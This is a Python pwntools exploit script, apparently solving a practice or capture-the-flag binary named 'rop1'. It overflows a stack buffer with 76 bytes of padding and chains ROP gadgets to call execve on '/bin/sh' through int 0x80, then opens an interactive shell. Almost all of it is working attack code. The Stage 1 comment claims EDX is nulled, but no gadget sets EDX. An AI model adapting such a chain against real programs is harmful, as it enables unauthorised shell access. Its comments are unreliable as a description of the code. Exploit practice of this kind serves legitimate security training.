#!/usr/bin/env python3
from pwn import *

# Set up pwntools
context.arch = 'i386'
context.os = 'linux'
context.log_level = 'debug'

# Start the process
p = process('./rop1')

# Important addresses
POP_EAX = 0x0804919a
POP_EBX = 0x0804901e
POP_ECX = 0x080491a4    # pop ecx ; mov ebx, 0xffffffff ; ret
INT_80 = 0x080491b4
BINSH = 0x804a008

# Create ROP chain
payload = b""
payload += b"A" * 76            # Padding to return address

# Stage 1: Set up EDX and ECX to NULL
payload += p32(POP_ECX)         # pop ecx ; mov ebx, 0xffffffff ; ret
payload += p32(0)               # NULL for both edx and ecx

# Stage 2: Set execve syscall number in EAX
payload += p32(POP_EAX)         # pop eax ; ret
payload += p32(0xb)             # execve syscall number

# Stage 3: Set /bin/sh pointer in EBX
payload += p32(POP_EBX)         # pop ebx ; ret
payload += p32(BINSH)           # pointer to /bin/sh string

# Stage 4: Execute syscall
payload += p32(INT_80)          # int 0x80

# Send payload
print("Sending payload...")
p.sendlineafter(b"isn't it?\n", payload)

# Try to interact
p.interactive()
